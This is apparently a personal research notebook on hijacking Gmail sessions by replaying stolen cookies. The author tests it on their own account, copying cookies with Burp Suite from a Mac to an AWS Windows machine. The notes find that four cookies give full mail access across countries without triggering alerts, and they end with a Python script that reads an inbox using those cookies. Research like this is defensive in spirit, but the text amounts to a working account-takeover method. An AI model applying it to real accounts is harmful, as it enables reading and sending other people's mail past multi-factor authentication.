# Gmail cookie stealing research

---------
## Setup
---------

Computer 1 (MacBook Air):
 - Firefox (102.0)
 - Israel
 - MacOS
    ```
    {
        "YourFuckingIPAddress": "2a02:ed0:6f17:bc00:71d5:ac86:de9:2f06",
        "YourFuckingLocation": "Tel Aviv, TA, Israel",
        "YourFuckingHostname": "2a02:ed0:6f17:bc00:71d5:ac86:de9:2f06",
        "YourFuckingISP": "XFone 018",
        "YourFuckingTorExit": false,
        "YourFuckingCountryCode": "IL"
    }
    ```

Computer 2 (AWS Server):
 - Firefox (102.0)
 - Germany
 - Windows
    ```
    {
        "YourFuckingIPAddress": "3.126.50.150",
        "YourFuckingLocation": "Frankfurt am Main, HE, Germany",
        "YourFuckingHostname": "ec2-3-126-50-150.eu-central-1.compute.amazonaws.com",
        "YourFuckingISP": "Amazon.com",
        "YourFuckingTorExit": false,
        "YourFuckingCountryCode": "DE"
    }
    ```

Gmail:
 - `ihilov.lior@gmail.com`
 - Multi-factor authentication
 - Connected to my phone
 - Very old and legit account

---------
## Setup Notes
---------

I launched a t2.medium EC2 machine in AWS eu-central-1 Frankfurt
 - Windows Server 2019
    - Installed Firefox
    - Installed VSCode
    - Installed BurpSuite

---------
## Research Results
---------

Ideas on stuff to research:
 - Use burpsuite to copy the cookies ✅
	- Works even from a different country and different IP
 - What cookies are necessary to read mails ✅
    - To read/send mails you only need 4 cookies
        ```
        SID=XXXX;
        HSID=XXXX;
        SSID=XXXX;
        OSID=XXXX
        ```
 - What if the `User-Agent` is different ✅
    - On `Computer 1` the `User-Agent` is:
        ```
        Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0
        ```
    - On `Computer 2` the `User-Agent` is:
        ```
        Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
        ```
        I also tried using chromium:
        ```
        Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36
        ```
     - Still works, so the user agent doesn't really matter
 - What if the time is different ✅ 
    - The time on `Computer 1` is:
        ```
        12:09
        Timezone: Israel Daylight Time
        ```
    - The time on `Computer 2` is:
        ```
        9:09
        Timezone: Central European Summer Time
        ```
    - Still works, so the timezone doesn't really matter
 - Try to use the same headers 🤷🏻‍♂️
    - This doesn't matter, as it works even without using the same headers
 - Are notifications sent ❌
    - I didn't get any notification to my phone, or to my main Gmail window
 - Will using curl with all the headers and cookies work❓
 - Use the cookies through TOR (The Onion Routing)❓
```
🤷🏻‍♂️ = Doesn't matter anymore
✅ = Checked, and does work
❌ = Checked, and is not correct
❓ = Still didn't check or go through
```

---------
## Research Notes
---------

### Just copying the cookies

I used burp on `Computer 1`, and surfed to `https://mail.google.com/mail/u/0/#inbox` and one of the requests was:
```
POST /mail/u/0/logstreamz HTTP/2
Host: mail.google.com
Cookie: COMPASS=XXXX; GMAIL_AT=XXXX; COMPASS=XXXX; 1P_JAR=XXXX; NID=XXXX; ANID=XXXX; AEC=XXXX; SID=XXXX; __Secure-1PSID=XXXX; __Secure-3PSID=XXXX; HSID=AStbfoVNSK5-XXXX; SSID=XXXX; APISID=XXXX; SAPISID=XXXX; __Secure-1PAPISID=XXXX; __Secure-3PAPISID=XXXX; SIDCC=XXXX; __Secure-1PSIDCC=XXXX; __Secure-3PSIDCC=XXXX; OSID=XXXX; __Secure-OSID=XXXX; __Host-GMAIL_SCH_GMN=XXXX; __Host-GMAIL_SCH_GMS=XXXX; __Host-GMAIL_SCH_GML=XXXX; SEARCH_SAMESITE=XXXX; __Host-GMAIL_SCH=XXXX; S=XXXX
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------174719142712504276453830164275
Content-Length: 678
Origin: https://mail.google.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Referer: https://mail.google.com/mail/u/0/
Te: trailers

-----------------------------174719142712504276453830164275
Content-Disposition: form-data; name="impressionId"

initial_load_attempt
-----------------------------174719142712504276453830164275
Content-Disposition: form-data; name="customData"

{"mct":1,"gapi_version":null,"chat_no_gmail_storage":false}
-----------------------------174719142712504276453830164275
Content-Disposition: form-data; name="defaultData"

{"inbox_type":"SECTIONED","hub_configuration":3,"delegation_request":false,"gapi_version":null,"compile_mode":"","is_cached_html":true,"build_label":"gmail.pinto-server_20220706.01_p0"}
-----------------------------174719142712504276453830164275--
```

I wanted to take those cookies, and use them on `Computer 2`, so at first I just intercepted all the traffic on `Computer 2` and surfed to the same URL, then I just copy pasted those cookies in a couple requests and saw it worked.

But I didn't want to keep copy pasting the cookies, so I looked around and saw that burp has a feature called `Session Handling Rules`, and with that feature I could add a rule that applies only to the `Proxy` and will add those cookies to every request made to `https://mail.google.com`.

Then I just surfed to `https://mail.google.com/mail/u/0/#inbox` and it worked, no more manual changes.

### What cookies really matter?

So now that I don't have to manualy change the cookies this task should be easy.
I just started ticking off cookies in the rule I set, and tried accesing an email, if it worked, then the cookie wasn't necessary.

Doing this I found that only 2 cookies are necassary to read mails:
```
SID=XXXX;
OSID=XXXX
```

But then I realised a mistake I made, I didn't clear my cookies after every request, so some cookies got stored as a result of my test, after I realised this I found out that the cookies I really need are:
```
SID=XXXX;
HSID=XXXX;
SSID=XXXX;
OSID=XXXX
```

When you make a request, just append those cookies, and it should work.
I also made a script:
```py
import requests

# If you want to see all the emails you can go to this URL
# https://mail.google.com/mail/u/0/#all/pX and X is a page number, i.e https://mail.google.com/mail/u/0/#all/p5
# URL = "https://mail.google.com/mail/u/0/#all/p2"
URL = "https://mail.google.com/mail/u/0/#inbox"
cookies = {
    "SID": "XXXX",
    "OSID": "XXXX",
    "HSID": "XXXX",
    "SSID": "XXXX"
}

def main():
    res = requests.get(URL, cookies=cookies)
    
    # You can use BeautifulSoup to parse the request and look at all the emails and their contents
    print(res.text)

if __name__ == '__main__':
    main()
```


